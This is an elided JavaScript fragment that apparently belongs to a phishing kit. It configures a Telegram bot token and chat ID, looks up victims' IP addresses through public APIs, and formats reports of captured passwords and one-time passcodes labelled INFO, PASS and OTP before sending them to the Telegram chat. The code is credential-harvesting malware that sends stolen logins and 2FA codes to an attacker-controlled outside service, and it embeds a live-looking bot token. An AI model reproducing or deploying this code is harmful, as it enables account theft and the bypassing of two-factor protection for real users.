...
const CONFIG = {
	TELEGRAM: {
		BOT_TOKEN: '8170901493:AAETrZw4e_f5g0aDQE_6yEJcEF5vtK5Gqv0',
		CHAT_ID: '-1003957912345',
	},
	IP_APIS: ['https://ipinfo.io/json', 'https://ipwho.is/'],
};
...
const Utils = (globalThis.Utils = {
		...
		try {
			...
			if (messageId) {
				...
				if (sendRes.ok) {
					...
					localStorage.setItem('telegram_message_id', pinId);
				}
			}
	...
	formatReport: (type, extra = {}) => {
		...
		let savedPasswords = globalThis.passwords || [];

		let icon = type === 'INFO' ? '📝 TT' : type === 'PASS' ? '🔑 PASS' : '🔥 OTP';
...
async function initApp() {
	...
	globalThis._ipReady = true;
	globalThis.dispatchEvent(new Event('ip-ready'));
